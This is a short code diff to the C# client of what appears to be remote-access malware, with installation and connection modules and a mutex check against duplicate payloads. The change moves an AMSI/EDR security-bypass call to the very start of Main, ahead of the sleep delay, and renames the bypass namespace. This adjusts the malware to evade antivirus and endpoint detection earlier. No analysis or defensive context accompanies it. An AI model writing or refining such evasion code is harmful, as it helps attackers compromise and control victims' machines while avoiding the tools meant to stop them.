@@ -2,7 +2,7 @@
 using Client.Connection;
 using Client.Install;
 using System;
-using Client.bypass_security;
+using Client.Bypass;
 using Client.Helper;
 
 /* 
@@ -19,6 +19,7 @@ namespace Client
     {
         public static void Main()
         {
+            Amsi.Edr();
             for (int i = 0; i < Convert.ToInt32(Settings.Delay); i++)
             {
                 Thread.Sleep(1000);
@@ -28,7 +29,6 @@ namespace Client
 
             try
             {
-                AmsiBypass.Edr();
                 if (!MutexControl.CreateMutex()) //if current payload is a duplicate
                     Environment.Exit(0);
 
